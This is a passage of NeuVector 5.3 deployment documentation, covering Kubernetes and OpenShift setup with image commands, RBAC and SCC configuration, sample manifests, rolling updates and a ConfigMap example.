readOnly: true # - mountPath: /host/cgroup # name: cgroup-vol # readOnly: true - mountPath: /var/nv_debug name: nv-debug readOnly: false terminationGracePeriodSeconds: 1200 restartPolicy: Always volumes: - name: modules-vol hostPath: path: /lib/modules # - name: runtime-sock # hostPath: # path: /var/run/docker.sock # path: /var/run/containerd/containerd.sock # path: /run/dockershim.sock # path: /run/k3s/containerd/containerd.sock # path: /var/run/crio/crio.sock # path: /var/vcap/sys/run/docker/docker.sock # - name: proc-vol # hostPath: # path: /proc # - name: cgroup-vol # hostPath: # path: /sys/fs/cgroup - name: nv-debug hostPath: path: /var/nv_debug --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-scanner-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-scanner-pod strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 2 template: metadata: labels: app: neuvector-scanner-pod spec: serviceAccountName: scanner serviceAccount: scanner containers: - name: neuvector-scanner-pod image: neuvector/scanner:latest imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: serviceAccountName: updater serviceAccount: updater containers: - name: neuvector-updater-pod image: neuvector/updater:latest imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never   PKS Change  note PKS is field tested and requires enabling privileged containers to the plan/tile, and changing the yaml hostPath as follows for Allinone, Enforcer:   hostPath: path: /var/vcap/sys/run/docker/docker.sock  ","version":"5.3","tagName":"h3"},{"title":"RedHat OpenShift","type":0,"sectionRef":"#","url":"/deploying/openshift","content":"","keywords":"","version":"5.3"},{"title":"Deploy Separate NeuVector Components with RedHat OpenShift​","type":1,"pageTitle":"RedHat OpenShift","url":"/deploying/openshift#deploy-separate-neuvector-components-with-redhat-openshift","content":" NeuVector is compatible with standard ovs SDN plug-ins as well as others such as flannel, weave, or calico. The samples below assume a standard ovs plug-in is used. This also assumes a local docker registry will be used (see instructions at end for creating the secret for dynamically pulling from neuvector or Docker Hub).  NeuVector supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm. The NeuVector Operator can also be used to deploy and is based on the Helm chart. To deploy the latest NeuVector container versions using an Operator, please use either the Red Hat Certified Operator from Operator Hub or the community operator, as detailed in the Operator section.  To deploy manually, first pull the appropriate NeuVector containers from the NeuVector registry into your local registry. Note: the scanner image should be pulled regularly for CVE database updates from NeuVector.  NeuVector Images on Docker Hub​  The images are on the NeuVector Docker Hub registry. Use the appropriate version tag for the manager, controller, enforcer, and leave the version as 'latest' for scanner and updater. For example: neuvector/manager:5.3.2  neuvector/controller:5.3.2  neuvector/enforcer:5.3.2  neuvector/scanner:latest  neuvector/updater:latest   Please be sure to update the image references in appropriate yaml files.  If deploying with the current NeuVector Helm chart (v1.8.9+), the following changes should be made to values.yml: Update the registry to docker.io  Update image names/tags to the current version on Docker hub, as shown above  Leave the imagePullSecrets empty   ","version":"5.3","tagName":"h3"},{"title":"Deploy on OpenShift​","type":1,"pageTitle":"RedHat OpenShift","url":"/deploying/openshift#deploy-on-openshift","content":" docker login docker.io docker pull docker.io/neuvector/manager:&lt;version&gt; docker pull docker.io/neuvector/controller:&lt;version&gt; docker pull docker.io/neuvector/enforcer:&lt;version&gt; docker pull docker.io/neuvector/scanner docker pull docker.io/neuvector/updater docker logout docker.io   The sample file below will deploy one manager, 3 controllers, and 2 scanner pods. It will deploy an enforcer on every node as a daemonset, including on the master node (if schedulable). See the bottom section for specifying dedicated manager or controller nodes using node labels. Note: It is not recommended to deploy (scale) more than one manager behind a load balancer due to potential session state issues. If you plan to use a PersistentVolume claim to store the backup of NeuVector config files, please see the general Backup/Persistent Data section in the Production Deployment overview.  Next, set the route and allow privileged NeuVector containers using the instructions below. By default, OpenShift does not allow privileged containers. Also, by default OpenShift does not schedule pods on the Master node. See the instructions at the end to enable/disable this.  note Please see the Enterprise Integration section for details on integration with OpenShift Role Based Access Controls (RBACs).  Login as a normal user  oc login -u &lt;user_name&gt;   Create a new project.  note If the --node-selector argument is used when creating a project this will restrict pod placement such as for the NeuVector enforcer to specific nodes.  oc new-project neuvector   Push NeuVector images to OpenShift docker registry.  note For OpenShift 4.6+, change docker-registry.default.svc below to image-registry.openshift-image-registry.svc in the commands below  docker login -u &lt;user_name&gt; -p `oc whoami -t` docker-registry.default.svc:5000 docker tag docker.io/neuvector/enforcer:&lt;version&gt; docker-registry.default.svc:5000/neuvector/enforcer:&lt;version&gt; docker tag docker.io/neuvector/controller:&lt;version&gt; docker-registry.default.svc:5000/neuvector/controller:&lt;version&gt; docker tag docker.io/neuvector/manager:&lt;version&gt; docker-registry.default.svc:5000/neuvector/manager:&lt;version&gt; docker tag docker.io/neuvector/scanner docker-registry.default.svc:5000/neuvector/scanner docker tag docker.io/neuvector/updater docker-registry.default.svc:5000/neuvector/updater docker push docker-registry.default.svc:5000/neuvector/enforcer:&lt;version&gt; docker push docker-registry.default.svc:5000/neuvector/controller:&lt;version&gt; docker push docker-registry.default.svc:5000/neuvector/manager:&lt;version&gt; docker push docker-registry.default.svc:5000/neuvector/scanner docker push docker-registry.default.svc:5000/neuvector/updater docker logout docker-registry.default.svc:5000   note Please see the section Updating the CVE Database below for recommendations for keeping the latest scanner image updated in your registry.  Login as system:admin account  oc login -u system:admin   Create Service Accounts and Grant Access to the Privileged SCC  oc create sa controller -n neuvector oc create sa enforcer -n neuvector oc create sa basic -n neuvector oc create sa updater -n neuvector oc create sa scanner -n neuvector oc create sa registry-adapter -n neuvector oc -n neuvector adm policy add-scc-to-user privileged -z enforcer   The following info will be added in the Privileged SCC users:  - system:serviceaccount:neuvector:enforcer   Add a new neuvector-scc-controller scc for controller service account in Openshift, by creating a file with:  allowHostDirVolumePlugin: false allowHostIPC: false allowHostNetwork: false allowHostPID: false allowHostPorts: false allowPrivilegeEscalation: false allowPrivilegedContainer: false allowedCapabilities: null apiVersion: security.openshift.io/v1 defaultAddCapabilities: null fsGroup: type: RunAsAny groups: [] kind: SecurityContextConstraints metadata: name: neuvector-scc-controller priority: null readOnlyRootFilesystem: false requiredDropCapabilities: - ALL runAsUser: type: RunAsAny seLinuxContext: type: RunAsAny supplementalGroups: type: RunAsAny users: [] volumes: - configMap - downwardAPI - emptyDir - persistentVolumeClaim - azureFile - projected - secret   Then apply  oc apply -f (filename)   Then run the following command to bind controller service account to neuvector-scc-controller scc  oc -n neuvector adm policy add-scc-to-user neuvector-scc-controller -z controller   In OpenShift 4.6+ use the following to check:  oc get rolebinding system:openshift:scc:privileged -n neuvector -o wide   NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS system:openshift:scc:privileged ClusterRole/system:openshift:scc:privileged 9m22s neuvector/enforcer   Run this command to check NeuVector service for Controller:  oc get rolebinding system:openshift:scc:neuvector-scc-controller n neuvector -o wide   The output will look like  NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS System:openshift:scc:neuvector-scc-controller ClusterRole/system:openshift:scc:neuvector-scc-controller 9m22s neuvector/controller   Create the custom resources (CRD) for NeuVector security rules. For OpenShift 4.6+ (Kubernetes 1.19+):  oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/crd-k8s-1.19.yaml oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/waf-crd-k8s-1.19.yaml oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/dlp-crd-k8s-1.19.yaml oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/com-crd-k8s-1.19.yaml oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/vul-crd-k8s-1.19.yaml oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/admission-crd-k8s-1.19.yaml   Add read permission to access the kubernetes API and OpenShift RBACs. IMPORTANT: The standard NeuVector 5.2+ deployment uses least-privileged service accounts instead of the default. See below if upgrading to 5.2+ from a version prior to 5.2.  attention If you are upgrading to 5.3.0+, run the following commands based on your current version: Version 5.2.0Versions prior to 5.2.0 oc delete clusterrole neuvector-binding-nvsecurityrules neuvector-binding-nvadmissioncontrolsecurityrules neuvector-binding-nvdlpsecurityrules neuvector-binding-nvwafsecurityrules   oc create clusterrole neuvector-binding-app --verb=get,list,watch,update --resource=nodes,pods,services,namespaces oc create clusterrole neuvector-binding-rbac --verb=get,list,watch --resource=rolebindings.rbac.authorization.k8s.io,roles.rbac.authorization.k8s.io,clusterrolebindings.rbac.authorization.k8s.io,clusterroles.rbac.authorization.k8s.io,imagestreams.image.openshift.io oc adm policy add-cluster-role-to-user neuvector-binding-app system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user neuvector-binding-rbac system:serviceaccount:neuvector:controller oc create clusterrole neuvector-binding-admission --verb=get,list,watch,create,update,delete --resource=validatingwebhookconfigurations,mutatingwebhookconfigurations oc adm policy add-cluster-role-to-user neuvector-binding-admission system:serviceaccount:neuvector:controller oc create clusterrole neuvector-binding-customresourcedefinition --verb=watch,create,get,update --resource=customresourcedefinitions oc adm policy add-cluster-role-to-user neuvector-binding-customresourcedefinition system:serviceaccount:neuvector:controller oc create clusterrole neuvector-binding-nvsecurityrules --verb=get,list,delete --resource=nvsecurityrules,nvclustersecurityrules oc create clusterrole neuvector-binding-nvadmissioncontrolsecurityrules --verb=get,list,delete --resource=nvadmissioncontrolsecurityrules oc create clusterrole neuvector-binding-nvdlpsecurityrules --verb=get,list,delete --resource=nvdlpsecurityrules oc create clusterrole neuvector-binding-nvwafsecurityrules --verb=get,list,delete --resource=nvwafsecurityrules oc adm policy add-cluster-role-to-user neuvector-binding-nvsecurityrules system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user view system:serviceaccount:neuvector:controller --rolebinding-name=neuvector-binding-view oc adm policy add-cluster-role-to-user neuvector-binding-nvwafsecurityrules system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user neuvector-binding-nvadmissioncontrolsecurityrules system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user neuvector-binding-nvdlpsecurityrules system:serviceaccount:neuvector:controller oc create role neuvector-binding-scanner --verb=get,patch,update,watch --resource=deployments -n neuvector oc adm policy add-role-to-user neuvector-binding-scanner system:serviceaccount:neuvector:updater system:serviceaccount:neuvector:controller -n neuvector --role-namespace neuvector oc create clusterrole neuvector-binding-co --verb=get,list --resource=clusteroperators oc adm policy add-cluster-role-to-user neuvector-binding-co system:serviceaccount:neuvector:enforcer system:serviceaccount:neuvector:controller oc create role neuvector-binding-secret --verb=get --resource=secrets -n neuvector oc adm policy add-role-to-user neuvector-binding-secret system:serviceaccount:neuvector:controller -n neuvector --role-namespace neuvector oc create clusterrole neuvector-binding-nvcomplianceprofiles --verb=get,list,delete --resource=nvcomplianceprofiles oc create clusterrolebinding neuvector-binding-nvcomplianceprofiles --clusterrole=neuvector-binding-nvcomplianceprofiles --serviceaccount=neuvector:controller oc create clusterrole neuvector-binding-nvvulnerabilityprofiles --verb=get,list,delete --resource=nvvulnerabilityprofiles oc create clusterrolebinding neuvector-binding-nvvulnerabilityprofiles --clusterrole=neuvector-binding-nvvulnerabilityprofiles --serviceaccount=neuvector:controller   Run the following command to check if the neuvector/controller, neuvector/enforcer and neuvector/updater service accounts are added successfully.  oc get ClusterRoleBinding neuvector-binding-app neuvector-binding-rbac neuvector-binding-admission neuvector-binding-customresourcedefinition neuvector-binding-nvsecurityrules neuvector-binding-view neuvector-binding-nvwafsecurityrules neuvector-binding-nvadmissioncontrolsecurityrules neuvector-binding-nvdlpsecurityrules neuvector-binding-co -o wide   Sample output:  NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS neuvector-binding-app ClusterRole/neuvector-binding-app 56d neuvector/controller neuvector-binding-rbac ClusterRole/neuvector-binding-rbac 34d neuvector/controller neuvector-binding-admission ClusterRole/neuvector-binding-admission 72d neuvector/controller neuvector-binding-customresourcedefinition ClusterRole/neuvector-binding-customresourcedefinition 72d neuvector/controller neuvector-binding-nvsecurityrules ClusterRole/neuvector-binding-nvsecurityrules 72d neuvector/controller neuvector-binding-view ClusterRole/view 72d neuvector/controller neuvector-binding-nvwafsecurityrules ClusterRole/neuvector-binding-nvwafsecurityrules 72d neuvector/controller neuvector-binding-nvadmissioncontrolsecurityrules ClusterRole/neuvector-binding-nvadmissioncontrolsecurityrules 72d neuvector/controller neuvector-binding-nvdlpsecurityrules ClusterRole/neuvector-binding-nvdlpsecurityrules 72d neuvector/controller neuvector-binding-co ClusterRole/neuvector-binding-co 72d neuvector/enforcer, neuvector/controller   And this command:  oc get RoleBinding neuvector-binding-scanner -n neuvector -o wide   Sample output:  NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS neuvector-binding-scanner Role/neuvector-binding-scanner 70d neuvector/updater, neuvector/controller   (Optional) Create the Federation Master and/or Remote Multi-Cluster Management Services. If you plan to use the multi-cluster management functions in NeuVector, one cluster must have the Federation Master service deployed, and each remote cluster must have the Federation Worker service. For flexibility, you may choose to deploy both Master and Worker services on each cluster so any cluster can be a master or remote.  Federated Management Services  apiVersion: v1 kind: Service metadata: name: neuvector-service-controller-fed-master namespace: neuvector spec: ports: - port: 11443 name: fed protocol: TCP type: NodePort selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-controller-fed-worker namespace: neuvector spec: ports: - port: 10443 name: fed protocol: TCP type: NodePort selector: app: neuvector-controller-pod   Then create the appropriate service(s):  oc create -f nv_master_worker.yaml   Create the neuvector services and pods based on the sample yamls below. Important! Replace the &lt;version&gt; tags for the manager, controller and enforcer image references in the yaml file. Also make any other modifications required for your deployment environment.  oc create -f &lt;compose file&gt;   That's it! You should be able to connect to the NeuVector console and login with admin:admin, e.g. https://&lt;public-ip&gt;:8443  To see how to access the console for the neuvector-webui service:  oc get services -n neuvector   If you have created your own namespace instead of using “neuvector”, replace all instances of “namespace: neuvector” and other namespace references with your namespace in the sample yaml files below.  OpenShift 4.6+ with CRI-O run-time  The name of your default OpenShift registry might have changed from docker-registry to openshift-image-registry. You may need to change the image registry for the manager, controller, and enforcer in the sample yaml.  note Type NodePort is used for the fed-master and fed-worker services instead of LoadBalancer. You may need to adjust for your deployment.  If using the CRI-O run-time, see this CRI-O sample.  Master Node Taints and Tolerations  All taint info must match to schedule Enforcers on nodes. To check the taint info on a node (e.g. Master):  $ oc get node taintnodename -o yaml   Sample output:  spec: taints: - effect: NoSchedule key: node-role.kubernetes.io/master # there may be an extra info for taint as below - effect: NoSchedule key: mykey value: myvalue   If there is additional taints as above, add these to the sample yaml tolerations section:  spec: template: spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane # if there is an extra info for taints as above, please add it here. This is required to match all the taint info defined on the taint node. Otherwise, the Enforcer won't deploy on the taint node - effect: NoSchedule key: mykey value: myvalue   ","version":"5.3","tagName":"h3"},{"title":"Using Node Labels for Manager and Controller Nodes​","type":1,"pageTitle":"RedHat OpenShift","url":"/deploying/openshift#using-node-labels-for-manager-and-controller-nodes","content":" To control which nodes the Manager and Controller are deployed on, label each node. Replace &lt;nodename&gt; with the appropriate node name.  oc label nodes &lt;nodename&gt; nvcontroller=true   Then add a nodeSelector to the yaml file for the Manager and Controller deployment sections. For example:   - mountPath: /host/cgroup name: cgroup-vol readOnly: true nodeSelector: nvcontroller: &quot;true&quot; restartPolicy: Always   To prevent the enforcer from being deployed on a controller node, if it is a dedicated management node (without application containers to be monitored), add a nodeAffinity to the Enforcer yaml section. For example:  app: neuvector-enforcer-pod spec: affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: nvcontroller operator: NotIn values: [&quot;true&quot;] imagePullSecrets:   ","version":"5.3","tagName":"h3"},{"title":"Updating the CVE Database on OpenShift Deployments​","type":1,"pageTitle":"RedHat OpenShift","url":"/deploying/openshift#updating-the-cve-database-on-openshift-deployments","content":" The latest scanner image always contains the most recent CVE database update from NeuVector. For this reason, a version tag is not recommended when pulling the image. However, updating the CVE database requires regular pulling of the latest scanner image so the updater cron job can redeploy the scanner(s). The samples above assume NeuVector images are pulled, tagged and pushed to a local OpenShift registry. Deployment is then from this registry instead of directly from neuvector (or the legacy NeuVector registry on docker hub).  To regularly update the CVE database, we recommend a script/cron job be created to pull the latest NeuVector scanner image and perform the tagging and pushing steps to the local registry. This will ensure the CVE database is being updated regularly and images and containers are being scanned for new vulnerabilities.  ","version":"5.3","tagName":"h3"},{"title":"Rolling Updates​","type":1,"pageTitle":"RedHat OpenShift","url":"/deploying/openshift#rolling-updates","content":" Orchestration tools such as Kubernetes, RedHat OpenShift, and Rancher support rolling updates with configurable policies. You can use this feature to update the NeuVector containers. The most important will be to ensure that there is at least one Allinone/Controller running so that policies, logs, and connection data is not lost. Make sure that there is a minimum of 30 seconds between container updates so that a new leader can be elected and the data synchronized between controllers.  Before starting the rolling updates, please pull and tag the NeuVector containers the same way as in the beginning of this page. You can pull the latest without a version number, but to trigger the rolling update you’ll need to tag the image with a version.  For example, for the controller (latest):  docker pull neuvector/controller   Then to tag/push, if latest version is 2.0.1, same as step 3 at the top of this page:  docker login -u &lt;user_name&gt; -p `oc whoami -t` docker-registry.default.svc:5000 docker tag neuvector/controller docker-registry.default.svc:5000/neuvector/controller:2.0.1 docker push docker-registry.default.svc:5000/neuvector/controller:2.0.1   You can now update your yaml file with these new versions and ‘apply’, or use the ‘oc set image ...’ command to trigger the rolling update. Please see the Kubernetes rolling update samples in this Production section to how to launch and monitor rolling updates of the NeuVector containers.  The provided sample deployment yamls already configure the rolling update policy. If you are updating via the NeuVector Helm chart, please pull the latest chart to properly configure new features such as admission control, and delete the old cluster role and cluster role binding for NeuVector.  ","version":"5.3","tagName":"h3"},{"title":"Enabling the REST API​","type":1,"pageTitle":"RedHat OpenShift","url":"/deploying/openshift#enabling-the-rest-api","content":" To enable the rest API, port 10443 must be configured as follows:  apiVersion: v1 kind: Service metadata: name: neuvector-service-controller namespace: neuvector spec: ports: - port: 10443 name: controller protocol: TCP type: NodePort selector: app: neuvector-controller-pod   ","version":"5.3","tagName":"h3"},{"title":"Enable/Disable Scheduling on the Master Node​","type":1,"pageTitle":"RedHat OpenShift","url":"/deploying/openshift#enabledisable-scheduling-on-the-master-node","content":" The following commands can be used to enable/disable the scheduling on the master node.  oc adm manage-node nodename --schedulable   oc adm manage-node nodename --schedulable=false   ","version":"5.3","tagName":"h3"},{"title":"OpenShift Deployment in Non-Privileged Mode​","type":1,"pageTitle":"RedHat OpenShift","url":"/deploying/openshift#openshift-deployment-in-non-privileged-mode","content":" The following instructions can be used to deploy NeuVector without using privileged mode containers. The controller is already in non-privileged mode and the enforcer deployment should be changed, which is shown in the excerpted snippets below.  Enforcer:  spec: template: metadata: annotations: container.apparmor.security.beta.kubernetes.io/neuvector-enforcer-pod: unconfined # this line below is required to be added if k8s version is pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-enforcer-pod: unconfined spec: containers: securityContext: # openshift seLinuxOptions: type: unconfined_t # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK - NET_RAW - SYS_CHROOT - MKNOD - AUDIT_WRITE - SETFCAP   The following sample is a complete deployment reference using the cri-o run-time. For other run-times please make the appropriate changes to the volumes/volume mounts for the crio.sock.  apiVersion: v1 kind: Service metadata: name: neuvector-svc-crd-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 30443 protocol: TCP name: crd-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-admission-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 20443 protocol: TCP name: admission-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-webui namespace: neuvector spec: ports: - port: 8443 name: manager protocol: TCP type: ClusterIP selector: app: neuvector-manager-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-controller namespace: neuvector spec: ports: - port: 18300 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18300&quot; - port: 18301 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18301&quot; - port: 18301 protocol: &quot;UDP&quot; name: &quot;cluster-udp-18301&quot; clusterIP: None selector: app: neuvector-controller-pod --- apiVersion: route.openshift.io/v1 kind: Route metadata: name: neuvector-route-webui namespace: neuvector spec: to: kind: Service name: neuvector-service-webui port: targetPort: manager tls: termination: passthrough --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-manager-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-manager-pod replicas: 1 template: metadata: labels: app: neuvector-manager-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-manager-pod image: image-registry.openshift-image-registry.svc:5000/neuvector/manager:&lt;version&gt; env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-controller-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-controller-pod minReadySeconds: 60 strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 3 template: metadata: labels: app: neuvector-controller-pod spec: affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - neuvector-controller-pod topologyKey: &quot;kubernetes.io/hostname&quot; serviceAccountName: controller serviceAccount: controller containers: - name: neuvector-controller-pod image: image-registry.openshift-image-registry.svc:5000/neuvector/controller:&lt;version&gt; securityContext: runAsUser: 0 readinessProbe: exec: command: - cat - /tmp/ready initialDelaySeconds: 5 periodSeconds: 5 env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP # - name: CTRL_PERSIST_CONFIG # value: &quot;1&quot; volumeMounts: # - mountPath: /var/neuvector # name: nv-share # readOnly: false - mountPath: /etc/config name: config-volume readOnly: true terminationGracePeriodSeconds: 300 restartPolicy: Always volumes: # - name: nv-share # persistentVolumeClaim: # claimName: neuvector-data - name: config-volume projected: sources: - configMap: name: neuvector-init optional: true - secret: name: neuvector-init optional: true - secret: name: neuvector-secret optional: true --- apiVersion: apps/v1 kind: DaemonSet metadata: name: neuvector-enforcer-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-enforcer-pod updateStrategy: type: RollingUpdate template: metadata: labels: app: neuvector-enforcer-pod annotations: container.apparmor.security.beta.kubernetes.io/neuvector-enforcer-pod: unconfined # Add the following for pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-enforcer-pod: unconfined spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane hostPID: true serviceAccountName: enforcer serviceAccount: enforcer containers: - name: neuvector-enforcer-pod image: image-registry.openshift-image-registry.svc:5000/neuvector/enforcer:&lt;version&gt; securityContext: # openshift seLinuxOptions: type: unconfined_t # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK - NET_RAW - SYS_CHROOT - MKNOD - AUDIT_WRITE - SETFCAP env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /lib/modules name: modules-vol readOnly: true # - mountPath: /run/runtime.sock # name: runtime-sock # readOnly: true # - mountPath: /host/proc # name: proc-vol # readOnly: true # - mountPath: /host/cgroup # name: cgroup-vol # readOnly: true - mountPath: /var/nv_debug name: nv-debug readOnly: false terminationGracePeriodSeconds: 1200 restartPolicy: Always volumes: - name: modules-vol hostPath: path: /lib/modules # - name: runtime-sock # hostPath: # path: /var/run/crio/crio.sock # - name: proc-vol # hostPath: # path: /proc # - name: cgroup-vol # hostPath: # path: /sys/fs/cgroup - name: nv-debug hostPath: path: /var/nv_debug --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-scanner-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-scanner-pod strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 2 template: metadata: labels: app: neuvector-scanner-pod spec: serviceAccountName: scanner serviceAccount: scanner containers: - name: neuvector-scanner-pod image: image-registry.openshift-image-registry.svc:5000/neuvector/scanner:&lt;version&gt; imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: serviceAccountName: updater serviceAccount: updater containers: - name: neuvector-updater-pod image: image-registry.openshift-image-registry.svc:5000/neuvector/updater:&lt;version&gt; imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never  ","version":"5.3","tagName":"h3"},{"title":"Deploy Using ConfigMap","type":0,"sectionRef":"#","url":"/deploying/production/configmap","content":"","keywords":"","version":"5.3"},{"title":"Kubernetes ConfigMap​","type":1,"pageTitle":"Deploy Using ConfigMap","url":"/deploying/production/configmap#kubernetes-configmap","content":" NeuVector supports automated configuration using the Kubernetes ConfigMap feature. This enables deployment of NeuVector containers with the appropriate configurations, integrations, and other settings in an automated way.  The 'always_reload: true' setting can be added in any ConfigMap yaml to force reload of that yaml every time the controller starts (version 4.3.2+). Otherwise, the ConfigMap will only be loaded at initial startup or after complete cluster restart (see persistent storage section below).  Complete Sample NeuVector ConfigMap (initcfg.yaml)​  The latest ConfigMap can be found here.  The sample is also shown below. This contains all the settings available. Please remove the sections not needed and edit the sections needed. Note: If using configmap in a secret, see section below for formatting changes.  apiVersion: v1 data: passwordprofileinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false active_profile_name: default pwd_profiles: # only default profile is supported. - name: default comment: default from configMap min_len: 6 min_uppercase_count: 0 min_lowercase_count: 0 min_digit_count: 0 min_special_count: 0 enable_block_after_failed_login: false block_after_failed_login_count: 0 block_minutes: 0 enable_password_expiration: false password_expire_after_days: 0 enable_password_history: false password_keep_history_count: 0 # Optional. value between 30 -- 3600 default 300 session_timeout: 300 roleinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false roles: # Optional. - Comment: test role # Mandatory. name can have ^[a-zA-Z0-9]+[.:a-zA-Z0-9_-]*$ Name: testrole # Mandatory Permissions: - id: config read: true write: true - id: rt_scan read: true write: true - id: reg_scan read: true write: true - id: ci_scan write: true - id: rt_policy read: true write: true - id: admctrl read: true write: true - id: compliance read: true write: true - id: audit_events read: true - id: security_events read: true - id: events read: true - id: authentication read: true write: true - id: authorization read: true write: true ldapinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false # Mandatory. OpenLDAP or MicrosoftAD directory: OpenLDAP # Mandatory. Hostname: 1.2.3.4 # Optional. the default value is 389 Port: 389 # Optional true or false or empty string(false) SSL: false # Mandatory. base_dn: cn=admin,dc=example,dc=org # Optional. bind_dn: dc=example,dc=org # Optional. bind_password: password # Optional. empty string(memberUid for openldap or member for windows ad) group_member_attr: # Optional. empty string(cn for openldap or sAMAccountName for windows ad) username_attr: # Optional. true or false or empty string(false) Enable: false # Optional. admin or reader or empty string(none) Default_Role: admin group_mapped_roles: - group: admin1 global_role: admin - group: reader1 global_role: reader - group: cipos1 global_role: ciops - group: admin2 global_role: admin - group: reader2 global_role: reader - group: ciops2 global_role: ciops - group: ns global_role: role_domains: testrole: - ns2-ciops1 - ns2-ciops2 reader: - ns2-reader1 - ns2-reader2 admin: - ns2-admin1 - ns2-admin2 - group: custom global_role: testrole role_domains: ciops: - custom-ciops1 - custom-ciops2 reader: - custom-reader1 - custom-reader2 admin: - custom-admin1 - custom-admin2 oidcinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false # Mandatory Issuer: https://... # Mandatory Client_ID: f53c56ec... # Mandatory 